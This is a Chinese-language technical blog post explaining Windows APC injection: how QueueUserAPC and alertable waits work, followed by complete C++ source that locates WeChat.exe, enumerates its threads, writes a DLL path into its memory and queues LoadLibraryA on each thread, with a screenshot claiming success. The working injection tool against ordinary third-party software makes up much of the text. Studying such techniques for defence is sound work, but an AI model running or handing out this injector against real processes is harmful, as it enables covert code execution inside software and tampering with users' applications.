## **前言**

APC称为异步过程调用，是一个链状的数据结构，可以让一个线程在其本应该的执行步骤前执行其他代码，Windows系统有很多进程，每个进程都有自己的线程，而每个线程都有自己的APC队列。当线程从等待状态苏醒后，会自动检测自己的APC队列中是否存在APC过程。

所以只需要将目标进程的线程的APC队列中添加APC过程，使线程从休眠中恢复就可以实现APC注入。

## 原理

当对面程序执行到某一个上面的等待函数的时候，系统会产生一个中断

当线程唤醒的时候，这个线程会优先去APC队列中调用回调函数

利用QueueUserApc函数，往这个队列中插入一个回调

插入回调的时候，把插入的回调地址改为LoadLibrary，插入的参数使用VirtualAllocEx申请内存，并写入进去

### 相关函数：

QueueUserApc：作用是添加制定的异步函数（回调函数）到执行的线程的APC队列中

APCproc：回调函数的写法

核心函数：QueueUserApc

使用方法：

    
    
    DWORD QueueUserAPC(
        [in] PAPCFUNC pfcAPC,
        [in] HANDLE hThread,
        [in] ULONG_PTR dwData   
    );

[in] pfnAPC:指向应用程序提供的APC函数的指针，该函数在指定线程执行可警报等操作时调用。当开始执行该APC的时候，程序会跳转到该函数地址处来执行

[in] hThread:线程的句柄。句柄必须具有THREAD_SET_CONTEXT方法权限。

[in]
dwData:传递给pfnAPC参数指向的APC函数的单个值。与远程注入类似，如果QueueUserAPC的第一个参数为LoadLibraryA，第三个参数设置的是dll路径既可完成dll注入。

返回值：

如果函数成功，则返回值非零；如果函数失败，则返回值为零。

Alertable
IO(告警IO)提供了更有效的异步通知形式。ReadFileEx/WriteFileEx在发出IO请求的同时，提供一个回调函数（APC过程），当IO请求完成后，一旦线程进入可告警状态，回调函数将会执行，以下五个函数能够使线程进入告警状态：

> SleepEX
>
> WaitForSingleObjectEx
>
> WaitForMultipleObjectsEx
>
> SignalObjectAndWait
>
> MsgWaitForMultipleObjectsEx

线程进入告警状态时，内核将会检查线程的APC队列，如果队列中有APC，将会按FIFO方式依次执行。如果队列为空，线程将会挂起等待事件对象。以后的某个时刻，一旦APC进入队列，线程将会被唤醒执行APC,同时等待函数返回WAIT_IO_COMPLETION。

QueueUserAPC可以用来人为投递APC,只要目标线程处于告警状态时，APC就能够得到执行。

注入条件：

> 必须是多线程环境
>
> 注入的程序必须会调用上面的那些同步对象

注入测试代码

    
    
    #include "Windows.h"
    #include "atlstr.h"
    #include "TlHelp32.h"
    #include "stdio.h"
    #include "iostream"   
    #include "string.h"
    
    using namespace std;
    
    #define PROCESS_NAME "WeChat.exe"
    
    
    //根据进程名获取PID
    DWORD GetPID(CString pProName) {
    	PROCESSENTRY32 pe32 = { 0 };
    	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    	BOOL bRet = FALSE;
    	DWORD dwPID = 0;
    	pe32.dwSize = sizeof(pe32);
    	bRet = Process32First(hSnap, &pe32);
    
    	while (bRet)
    	{
    		if (lstrcmp(pe32.szExeFile, pProName) == 0)
    		{
    			dwPID = pe32.th32ProcessID;
    			break;
    		}
    		bRet = Process32Next(hSnap, &pe32);
    	}
    
    	CloseHandle(hSnap);
    exit:
    	return dwPID;
    }
    
    //列出指定进程的所有线程
    BOOL GetProcessThreadList(DWORD th32ProcessID, DWORD** ppThreadIdList, LPDWORD pThreadIdListLength)
    {
    	// 申请空间
    	DWORD dwThreadIdListLength = 0;
    	DWORD dwThreadIdListMaxCount = 2000;
    	LPDWORD pThreadIdList = NULL;
    	HANDLE hThreadSnap = INVALID_HANDLE_VALUE;
    
    	pThreadIdList = (LPDWORD)VirtualAlloc(NULL, dwThreadIdListMaxCount * sizeof(DWORD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    	if (pThreadIdList == NULL)
    	{
    		return FALSE;
    	}
    
    	RtlZeroMemory(pThreadIdList, dwThreadIdListMaxCount * sizeof(DWORD));
    
    	THREADENTRY32 th32 = { 0 };
    
    	// 拍摄快照
    	hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, th32ProcessID);
    
    	if (hThreadSnap == INVALID_HANDLE_VALUE)
    	{
    		return FALSE;
    	}
    
    	// 结构的大小
    	th32.dwSize = sizeof(THREADENTRY32);
    
    	//遍历所有THREADENTRY32结构, 按顺序填入数组
    
    	BOOL bRet = Thread32First(hThreadSnap, &th32);
    	while (bRet)
    	{
    		if (th32.th32OwnerProcessID == th32ProcessID)
    		{
    			if (dwThreadIdListLength >= dwThreadIdListMaxCount)
    			{
    				break;
    			}
    			pThreadIdList[dwThreadIdListLength++] = th32.th32ThreadID;
    		}
    		bRet = Thread32Next(hThreadSnap, &th32);
    	}
    
    	*pThreadIdListLength = dwThreadIdListLength;
    	*ppThreadIdList = pThreadIdList;
    
    	return TRUE;
    }
    
    
    BOOL APCInject(HANDLE hProcess, CHAR* wzDllFullPath, LPDWORD pThreadIdList, DWORD dwThreadIdListLength)
    {
    	// 申请内存
    
    	PVOID lpAddr = NULL;
    	SIZE_T page_size = 4096;
    
    	lpAddr = ::VirtualAllocEx(hProcess, nullptr, page_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    	if (lpAddr == NULL)
    	{
    		VirtualFreeEx(hProcess, lpAddr, page_size, MEM_DECOMMIT);
    		CloseHandle(hProcess);
    		return FALSE;
    	}
    	// 把Dll的路径复制到内存中
    	if (FALSE == ::WriteProcessMemory(hProcess, lpAddr, wzDllFullPath, (strlen(wzDllFullPath) + 1) * sizeof(wzDllFullPath), nullptr))
    	{
    		VirtualFreeEx(hProcess, lpAddr, page_size, MEM_DECOMMIT);
    		CloseHandle(hProcess);
    		return FALSE;
    	}
    
    	// 获得LoadLibraryA的地址
    	PVOID loadLibraryAddress = ::GetProcAddress(::GetModuleHandle("kernel32.dll"), "LoadLibraryA");
    
    	// 遍历线程, 插入APC
    	float fail = 0;
    	for (int i = dwThreadIdListLength - 1; i >= 0; i--)
    	{
    		// 打开线程
    		HANDLE hThread = ::OpenThread(THREAD_ALL_ACCESS, FALSE, pThreadIdList[i]);
    		if (hThread)
    		{
    			// 插入APC
    			if (!::QueueUserAPC((PAPCFUNC)loadLibraryAddress, hThread, (ULONG_PTR)lpAddr))
    			{
    				fail++;
    			}
    			// 关闭线程句柄
    			::CloseHandle(hThread);
    			hThread = NULL;
    		}
    	}
    
    	printf("Total Thread: %d\n", dwThreadIdListLength);
    	printf("Total Failed: %d\n", (int)fail);
    
    	if ((int)fail == 0 || dwThreadIdListLength / fail > 0.5)
    	{
    		printf("Success to Inject APC\n");
    		return TRUE;
    	}
    	else
    	{
    		printf("Inject may be failed\n");
    		return FALSE;
    	}
    }
    
    
    int main()
    {
    	DWORD dwPid = 0;
    	dwPid = GetPID(PROCESS_NAME);
    	cout << dwPid << endl;
    
    	CHAR wzDllFullPath[MAX_PATH] = { 0 };
    	LPDWORD pThreadIdList = NULL;
    	DWORD dwThreadIdListLength = 0;
    
    
    	strcpy_s(wzDllFullPath, "D:\\DllMain.dll");
    
    	//检测程序是否是多线程
    	if (!GetProcessThreadList(dwPid, &pThreadIdList, &dwThreadIdListLength))
    	{
    		printf("Can not list the threads\n");
    		exit(0);
    	}
    	//打开句柄
    	HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, dwPid);
    
    	if (hProcess == NULL)
    	{
    		printf("Failed to open Process\n");
    		return FALSE;
    	}
    
    	//注入
    	if (!APCInject(hProcess, wzDllFullPath, pThreadIdList, dwThreadIdListLength))
    	{
    		printf("Failed to inject DLL\n");
    		return FALSE;
    	}
    	return 0;
    }

注入微信成功

![1668961202_637a53b2d37924b410fa8.png!small?1668961226279](https://image.3001.net/images/20221121/1668961202_637a53b2d37924b410fa8.png!small?1668961226279)

  

